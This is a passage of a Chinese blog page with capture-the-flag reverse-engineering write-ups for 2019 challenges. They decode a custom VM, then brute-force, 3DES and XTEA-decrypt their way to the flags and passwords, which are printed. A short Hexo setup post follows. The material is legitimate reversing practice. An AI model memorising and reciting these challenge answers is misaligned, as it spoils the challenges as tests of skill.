<td>0x08</td>
<td>-</td>
<td>寄存器</td>
<td>立即数</td>
<td>num1&#x3D;nmu2</td>
</tr>
<tr>
<td>0x09</td>
<td>ret</td>
<td>-</td>
<td>-</td>
<td>返回 0</td>
</tr>
<tr>
<td>0x0A</td>
<td>load</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1&#x3D;tran_pass[num2]</td>
</tr>
<tr>
<td>0x0B</td>
<td>load</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1&#x3D;const_ARR[num2]</td>
</tr>
<tr>
<td>0x0C</td>
<td>xor</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1^&#x3D;num2</td>
</tr>
<tr>
<td>0x0D</td>
<td>imul</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1*&#x3D;num2</td>
</tr>
<tr>
<td>0x0E</td>
<td>DIV</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1&#x2F;&#x3D;num2</td>
</tr>
<tr>
<td>0x0F</td>
<td>shl</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1&lt;&lt;&#x3D;num2</td>
</tr>
<tr>
<td>0x10</td>
<td>shr</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1&gt;&gt;&#x3D;num2</td>
</tr>
<tr>
<td>0xFF</td>
<td>ret</td>
<td>-</td>
<td>-</td>
<td>返回 1</td>
</tr>
</tbody></table>
<p>然后指令就是地址4110c0 所指向的内容：</p>
<p><img src="/1763433999325-10.png" alt="img"></p>
<p>即：</p>
<table>
<thead>
<tr>
<th>地址</th>
<th>数据</th>
<th>指令</th>
</tr>
</thead>
<tbody><tr>
<td>004110c0</td>
<td>08 00 00 00 20 00</td>
<td>mov R0, 0x20</td>
</tr>
<tr>
<td>004110c6</td>
<td>08 00 01 00 00 00</td>
<td>mov R1, 0x00</td>
</tr>
<tr>
<td>004110cc</td>
<td>08 00 02 00 01 00</td>
<td>mov R2, 0x01</td>
</tr>
<tr>
<td>004110d2</td>
<td>03 00 01 00 00 00</td>
<td>cmp R1, R0</td>
</tr>
<tr>
<td>004110d8</td>
<td>04 01 16 00 00 00</td>
<td>jz +0x16</td>
</tr>
<tr>
<td>004110de</td>
<td>08 00 0b 00 00 00</td>
<td>mov RB, 0x00</td>
</tr>
<tr>
<td>004110e4</td>
<td>08 00 0c 00 00 00</td>
<td>mov RC, 0x00</td>
</tr>
<tr>
<td>004110ea</td>
<td>01 00 0c 00 0b 00</td>
<td>add RC, RB</td>
</tr>
<tr>
<td>004110f0</td>
<td>03 00 0b 00 01 00</td>
<td>cmp RB, R1</td>
</tr>
<tr>
<td>004110f6</td>
<td>01 00 0b 00 02 00</td>
<td>add RB, R2</td>
</tr>
<tr>
<td>004110fc</td>
<td>04 02 fc ff 00 00</td>
<td>jnz -0x04</td>
</tr>
<tr>
<td>00411102</td>
<td>08 00 03 00 08 00</td>
<td>mov R3, 0x08</td>
</tr>
<tr>
<td>00411108</td>
<td>08 00 04 00 06 00</td>
<td>mov R4, 0x06</td>
</tr>
<tr>
<td>0041110e</td>
<td>08 00 09 00 10 00</td>
<td>mov R9, 0x10</td>
</tr>
<tr>
<td>411114</td>
<td>0f 00 09 00 03 00</td>
<td>shl R9, R3</td>
</tr>
<tr>
<td>0041111a</td>
<td>08 00 0a 00 24 00</td>
<td>mov Ra, 0x24</td>
</tr>
<tr>
<td>411120</td>
<td>01 00 09 00 0a 00</td>
<td>add R9, Ra</td>
</tr>
<tr>
<td>411126</td>
<td>01 00 09 00 0c 00</td>
<td>add R9, RB</td>
</tr>
<tr>
<td>0041112c</td>
<td>0a 00 05 00 01 00</td>
<td>LOAD R5, R1 &#x2F;&#x2F;_pass</td>
</tr>
<tr>
<td>411132</td>
<td>0d 00 05 00 09 00</td>
<td>imul R5, R9</td>
</tr>
<tr>
<td>411138</td>
<td>05 00 06 00 05 00</td>
<td>mov R6, R5</td>
</tr>
<tr>
<td>0041113e</td>
<td>10 00 06 00 04 00</td>
<td>shr R6, R4</td>
</tr>
<tr>
<td>411144</td>
<td>0b 00 07 00 01 00</td>
<td>LOAD R7, R1 &#x2F;&#x2F;_const</td>
</tr>
<tr>
<td>0041114a</td>
<td>03 00 06 00 07 00</td>
<td>cmp R6, R7</td>
</tr>
<tr>
<td>411150</td>
<td>01 00 01 00 02 00</td>
<td>add R1, R2</td>
</tr>
<tr>
<td>411156</td>
<td>04 01 e9 ff 00 00</td>
<td>jz -0x17</td>
</tr>
<tr>
<td>0041115c</td>
<td>04 02 01 00 00 00</td>
<td>jnz +1</td>
</tr>
<tr>
<td>411162</td>
<td>ff 00 00 00 00 00</td>
<td>ret 1</td>
</tr>
<tr>
<td>411168</td>
<td>09 00 00 00 00 00</td>
<td>ret 0</td>
</tr>
<tr>
<td>0041116e</td>
<td>ff 00 00 00 00 00</td>
<td>ret 1</td>
</tr>
</tbody></table>
<p>最后推出算式<code>const_ARR[i]=(((0x10&lt;&lt;8)+0x24+ (i) )*tran_pass[i])&gt;&gt;6</code></p>
<p>但是这种直接分析太麻烦，也可以使用动态调试（推荐使用）</p>
<p>很容易就能看出算法为<code>const_ARR[i] = (input[i] * out) &gt;&gt; 6,其中out的初值为0x1024，out += 1+i</code></p>
<p>爆破一下password：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">flagenc = [<span class="number">0x00000C5B</span>, <span class="number">0x00000CDD</span>, <span class="number">0x00000D1F</span>, <span class="number">0x000018C0</span>, <span class="number">0x000018C6</span>, <span class="number">0x00000C26</span>, <span class="number">0x00000E72</span>, <span class="number">0x00000DF7</span>, <span class="number">0x000019B1</span>, <span class="number">0x00000D41</span>, <span class="number">0x00000D08</span>, <span class="number">0x0000191C</span>, <span class="number">0x00000CD9</span>, <span class="number">0x00000EB1</span>, <span class="number">0x00000CEE</span>, <span class="number">0x00001A78</span>, <span class="number">0x00000D8B</span>, <span class="number">0x00000D99</span>, <span class="number">0x00000D64</span>, <span class="number">0x00000CED</span>, <span class="number">0x000019F8</span>, <span class="number">0x00000E61</span>, <span class="number">0x00001A7F</span>, <span class="number">0x00001AE7</span>, <span class="number">0x00000F26</span>, <span class="number">0x00001B34</span>, <span class="number">0x00001AD0</span>, <span class="number">0x00000D7C</span>, <span class="number">0x00000FC9</span>, <span class="number">0x00000E7E</span>, <span class="number">0x00001C0E</span>, <span class="number">0x00001BAE</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">out = <span class="number">0x1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flagenc)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">                <span class="keyword">if</span>(((j * out) &gt;&gt; <span class="number">6</span>) == flagenc[i]):</span><br><span class="line">                        flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                        <span class="built_in">print</span>(flag)</span><br><span class="line">        out += (i + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#134bb097e43b292f4431b6cd8db194db</span></span><br></pre></td></tr></table></figure>

<p>所以用户名就是dd772,密码就是134bb097e43b292f4431b6cd8db194db</p>
<p>得到flag</p>
<p><img src="/1763433999325-11.png" alt="img"></p>
<h1 id="2019-re-Justre"><a href="#2019-re-Justre" class="headerlink" title="2019 re Justre"></a>2019 re Justre</h1><p>A1BAAAAAAAAAAAAAAAAAAAAAAA</p>
<p>前8个A1BAAAAA为一组  xmm5中有4个</p>
<p>第二个8个，先判断是否为数字，不是的话判断是否为大写字母，是数字下面的标点以及大写字母的话v14&#x3D;16*（该字符-7），   是大写字母下面的字符的话把v14&#x3D;0，是数字前面的符号的话v14&#x3D;16*该字符</p>
<p>可能是两个字节两个字节取，如果第二个是数字则将v10&#x3D;v14+该数字，如果是大写字母v10&#x3D;v14+该字符-55</p>
<p>然后还有很长的一段的运算两种情况都需要进行</p>
<p>AA 复制16份然后每八个一份放入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00404340 xmmword_404340 xmmword 3000000020000000100000000h</span><br><span class="line">.rdata:00404340                                         ; DATA XREF: sub_401610+151↑r</span><br><span class="line">.rdata:00404350 xmmword_404350 xmmword 4000000040000000400000004h</span><br><span class="line">.rdata:00404350                                         ; DATA XREF: sub_401610+190↑r</span><br><span class="line">.rdata:00404360 xmmword_404360 xmmword 8000000080000000800000008h</span><br><span class="line">.rdata:00404360                                         ; DATA XREF: sub_401610+1B8↑r</span><br><span class="line">.rdata:00404370 xmmword_404370 xmmword 0C0000000C0000000C0000000Ch</span><br><span class="line">.rdata:00404370                                         ; DATA XREF: sub_401610+1DA↑r</span><br><span class="line">.rdata:00404380 xmmword_404380 xmmword 1010101010101010101010101010101h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data:00405018 xmmword_405018 xmmword 3D5E1084FD0E0A2CE98FBCC77AB29357h</span><br><span class="line">.data:00405018                                         ; DATA XREF: sub_401610+166↑r</span><br><span class="line">.data:00405018                                         ; sub_401610+189↑w</span><br><span class="line">.data:00405018                                         ; sub_401610:loc_401814↑r</span><br><span class="line">.data:00405018                                         ; sub_401610+212↑w</span><br><span class="line">.data:00405018                                         ; sub_401610:loc_401831↑r</span><br><span class="line">.data:00405018                                         ; sub_401610+259↑o</span><br><span class="line">.data:00405028 xmmword_405028 xmmword 3D4F7424ED150C28FB39F0A384C9FB26h</span><br><span class="line">.data:00405028                                         ; DATA XREF: sub_401610+17B↑r</span><br><span class="line">.data:00405028                                         ; sub_401610+1B1↑w</span><br><span class="line">.data:00405038 xmmword_405038 xmmword 5715BAFE28EA503D065C0BEB3CCE6C2Ah</span><br><span class="line">.data:00405038                                         ; DATA XREF: sub_401610+19B↑r</span><br><span class="line">.data:00405038                                         ; sub_401610+1ED↑w</span><br><span class="line">.data:00405048 xmmword_405048 xmmword 63184D41064DEFECAF152E2F3D4F842Bh</span><br></pre></td></tr></table></figure>

<p>AA 先被扩展为AAAAAAAA 然后再被扩展为相同的四个整数，然后每个再*01010101</p>
<p>xmm4 &#x3D; (AA*4)*01010101</p>
<p>xmm5 &#x3D; A1BAAAAA*4</p>
<p>状态变量1 0x405018 更新：</p>
<p>xmm1&#x3D;(xmm4 + 0x405018)</p>
<p>xmm2 &#x3D; (xmm5 + 0x404340)</p>
<p> 0x405018 &#x3D; xmm2 ^ xmm1</p>
<p>状态变量2 0x405028更新：</p>
<p>xmm1 &#x3D; (xmm4 + 0x405028)</p>
<p>xmm2 &#x3D; (0x404340 + 0x404350 + xmm5)</p>
<p>0x405028 &#x3D; xmm2 ^ xmm1</p>
<p>状态变量3 0x405038更新：</p>
<p>xmm1 &#x3D; (xmm4 + 0x405038)</p>
<p>xmm2 &#x3D; (0x404340 + 0x404360 + xmm5)</p>
<p>0x405038 &#x3D; xmm2 ^ xmm1</p>
<p>状态变量4 0x405048更新：</p>
<p>xmm4 &#x3D; xmm4 + 0x405048</p>
<p>xmm1 &#x3D; (0x404340 + 0x404370 + xmm5)</p>
<p>0x405048 &#x3D; xmm4 ^ xmm1</p>
<p>v2 &#x3D; A1BAAAAA v10 &#x3D; AA</p>
<p>v19&#x3D;16</p>
<p>while（v19&lt;24）{</p>
<p>*（ 0x405018 + v19 ）&#x3D; （v19 + v2）^ (16843009 * v10 + *（ 0x405018 + v19 ）);</p>
<p>++v19;</p>
<p>}</p>
<p>实际上就是input[i] &#x3D; (flag1+i) ^ (flag2 + input[i])</p>
<p><img src="/1763433999325-12.png" alt="img"></p>
<p>但是最后比较的步骤只需要关注第一个32位的部分就行了，所以除状态一外都不需要分析，因为只有两个未知量，所以用三个式子就能爆破出来。</p>
<p>最后对比的字节为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x83EC8B55, 0xEC81F0E4, 0x00000278</span><br></pre></td></tr></table></figure>

<p>所以爆破就行了：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i0 = <span class="number">0x7AB29357</span>; <span class="type">int</span> o0 = <span class="number">0x83EC8B55</span>;</span><br><span class="line">    <span class="type">int</span> i1 = <span class="number">0xE98FBCC7</span>; <span class="type">int</span> o1 = <span class="number">0xEC81F0E4</span>;</span><br><span class="line">    <span class="type">int</span> i2 = <span class="number">0xFD0E0A2C</span>; <span class="type">int</span> o2 = <span class="number">0x00000278</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">-128</span>; j != <span class="number">128</span>; j++) &#123;</span><br><span class="line">        <span class="type">int</span> flag = o0 ^ ((<span class="number">0x01010101</span> * j) + i0);</span><br><span class="line">        <span class="keyword">if</span> (o1 == ((flag + <span class="number">1</span>) ^ (<span class="number">0x01010101</span> * j + i1))</span><br><span class="line">            &amp;&amp; o2 == ((flag + <span class="number">2</span>) ^ (<span class="number">0x01010101</span> * j + i2)))</span><br><span class="line">            &#123;cout &lt;&lt; flag &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; j &lt;&lt; endl;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%X%X\n&quot;</span>, flag, j);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 前十个字符就是：1324223816</span></span><br></pre></td></tr></table></figure>

<p>然后就是后16个字符，这里的检验函数4018A0用了SMC，需要解密一下，来到4018A0使用OD将其dump出来</p>
<p>用ida打开，即可查看逻辑</p>
<p><img src="/1763433999325-13.png" alt="img"></p>
<p>查看逻辑，这里sub_401250明显是des算法，调用三次，分别是加密、解密、加密，即3DES算法</p>
<p><img src="/1763433999325-14.png" alt="img"></p>
<p>到底是不是，找个网站解密试试就知道了，发现可以解出来：</p>
<p><img src="/1763433999325-15.png" alt="img"></p>
<p>最后放入程序验证，成功得到flag</p>
<p><img src="/1763433999325-16.png" alt="img"></p>
<p>flag{13242238160dcc509a6f75849b}</p>
<h1 id="2019-re-webAssemble"><a href="#2019-re-webAssemble" class="headerlink" title="2019 re webAssemble"></a>2019 re webAssemble</h1><p>.wasm文件逆向管用套路：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/tools/wasm2c  webassembly.wasm -o web.c</span><br><span class="line">gcc -c web.c -o web.o</span><br></pre></td></tr></table></figure>

<p>然后ida分析</p>
<p><img src="/1763433999325-17.png" alt="img"></p>
<p>main函数主要加密函数就这俩，f54有点复杂，先瞅瞅f15</p>
<p><img src="/1763433999325-18.png" alt="img"></p>
<p><img src="/1763433999325-19.png" alt="img"></p>
<p>观察到魔数<code>9E3779B9</code>，然后循环了32次，应该是一个循环32次的XTEA算法</p>
<p>该算法被调用了4次，四次算法密钥均为0</p>
<p>那这样的话就找找后续的对比操作，找最后需对比的字符串</p>
<p><img src="/1763433999325-20.png" alt="img"></p>
<p>可以看到后面一堆赋值操作</p>
<p>是用加密后的每一位分别异或一个值，然后取低8位，最后和前面一次算出来的值迭代相加。</p>
<p><img src="/1763433999325-21.png" alt="img"></p>
<p>然后最后判断是否相等</p>
<p>那就假设每个式子的结果为0，那么所有式子就都成立，也就是说最后经算法加密后的值为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x4e,0x6e,0xc7,0xea,</span><br><span class="line">0x8a,0x9d,0x70,0x89,//第1次xtea</span><br><span class="line"> </span><br><span class="line">0xeb,0xe2,0x45,0xd3,</span><br><span class="line">0xb8,0x4a,0xc0,0x73,//第2次xtea</span><br><span class="line"> </span><br><span class="line">0xb0,0x4a,0x40,0x71,</span><br><span class="line">0x37,0x34,0x88,0x42,//第3次xtea</span><br><span class="line"> </span><br><span class="line">0x32,0x88,0x80,0xd0,</span><br><span class="line">0x89,0xdb,0xa1,0x1e,//第4次xtea</span><br><span class="line"> </span><br><span class="line">0x35,0x38,0x39,0x31,</span><br><span class="line">0x33,0x7d//没有加密</span><br></pre></td></tr></table></figure>

<p>先找个现成的算法解密一下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, delta=<span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data[]=&#123;</span><br><span class="line">        <span class="number">0x4e</span>,<span class="number">0x6e</span>,<span class="number">0xc7</span>,<span class="number">0xea</span>,</span><br><span class="line">        <span class="number">0x8a</span>,<span class="number">0x9d</span>,<span class="number">0x70</span>,<span class="number">0x89</span>,<span class="comment">//第1次xtea</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0xeb</span>,<span class="number">0xe2</span>,<span class="number">0x45</span>,<span class="number">0xd3</span>,</span><br><span class="line">        <span class="number">0xb8</span>,<span class="number">0x4a</span>,<span class="number">0xc0</span>,<span class="number">0x73</span>,<span class="comment">//第2次xtea</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0xb0</span>,<span class="number">0x4a</span>,<span class="number">0x40</span>,<span class="number">0x71</span>,</span><br><span class="line">        <span class="number">0x37</span>,<span class="number">0x34</span>,<span class="number">0x88</span>,<span class="number">0x42</span>,<span class="comment">//第3次xtea</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0x32</span>,<span class="number">0x88</span>,<span class="number">0x80</span>,<span class="number">0xd0</span>,</span><br><span class="line">        <span class="number">0x89</span>,<span class="number">0xdb</span>,<span class="number">0xa1</span>,<span class="number">0x1e</span>,<span class="comment">//第4次xtea</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0x35</span>,<span class="number">0x38</span>,<span class="number">0x39</span>,<span class="number">0x31</span>,</span><br><span class="line">        <span class="number">0x33</span>,<span class="number">0x7d</span><span class="comment">//没有加密</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">        <span class="built_in">decipher</span>(<span class="number">32</span>,(<span class="type">unsigned</span> <span class="type">int</span>*)(data+i*<span class="number">8</span>),key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;38fd643cc2c5200cc769b31ae7e58913&#125;</span></span><br></pre></td></tr></table></figure>

<p>运行发现直接跑出来flag了：</p>
<p><img src="/1763433999325-22.png" alt="img"></p>
<p><img src="/1763433999325-23.png" alt="img"></p>
<p><img src="/1763433999325-24.png" alt="img"></p>
<p>并且验证成功</p>
<p>那就不需要再继续分析f54了，证明该函数和flag验证流程没关系</p>
<h1 id="2019-re-BoringCrypto"><a href="#2019-re-BoringCrypto" class="headerlink" title="2019 re BoringCrypto"></a>2019 re BoringCrypto</h1><p>安卓native类型逆向，首先分析java中main函数，可知check函数使用的是jni的静态注册方法，因此应该比较容易找到，那么就找到native.so然后用ida打开：</p>
<p><img src="/1763433999325-25.png" alt="img"></p>
<p><img src="/1763433999325-26.png" alt="img"></p>
<p>这个函数反汇编之后都有将近5000行，太复杂，看不太懂qaq</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/11/22/qwb2019-re/" data-id="cuid5Qx_8civHNxywAYbGQ9N5" data-title="qwb2019-re" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hello" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/11/17/hello/" class="article-date">
  <time class="dt-published" datetime="2023-11-17T07:08:30.000Z" itemprop="datePublished">2023-11-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/11/17/hello/">hello</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="安装git和nodejs"><a href="#安装git和nodejs" class="headerlink" title="安装git和nodejs"></a>安装git和nodejs</h2><p>官方下载地址: <a href="https://link.zhihu.com/?target=https://git-scm.com/download/win">Git - Downloading Package (git-scm.com)</a></p>
<p>官方下载地址: <a href="https://link.zhihu.com/?target=https://nodejs.org/en/">Node.js (nodejs.org)</a></p>
<p>在 cmd 中输入命令 <code>git --version</code>, 查看 Git 版本</p>
<p>在 cmd 中输入命令 <code>node -v</code>, 查看 Node 版本</p>
<h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>使用 cnpm 安装 Hexo，先通过 npm install 安装 cnpm。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry==https://registry.npm.taobao.org</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 cmd 中输入命令 cnpm -v, 可查看 cnpm 版本</span></span><br><span class="line">cnpm install -g hexo-cli</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 cmd 中输入命令 hexo -v, 可查看 hexo 版本</span></span><br></pre></td></tr></table></figure>





<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>hjkkgktest</p>
<p><img src="/2023/11/17/hello/wallhaven-rq75r7.jpg" alt="wallhaven-rq75r7"></p>
<p>et2<img src="/2023/11/17/hello/wallhaven-2yg1lg.png" alt="wallhaven-2yg1lg"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/11/17/hello/" data-id="cuidP-WXZQZxDwbRQArr7w28Y" data-title="hello" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-qwb2018-re" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/16/qwb2018-re/" class="article-date">
  <time class="dt-published" datetime="2023-08-16T02:48:56.000Z" itemprop="datePublished">2023-08-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/16/qwb2018-re/">qwb2018-re</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
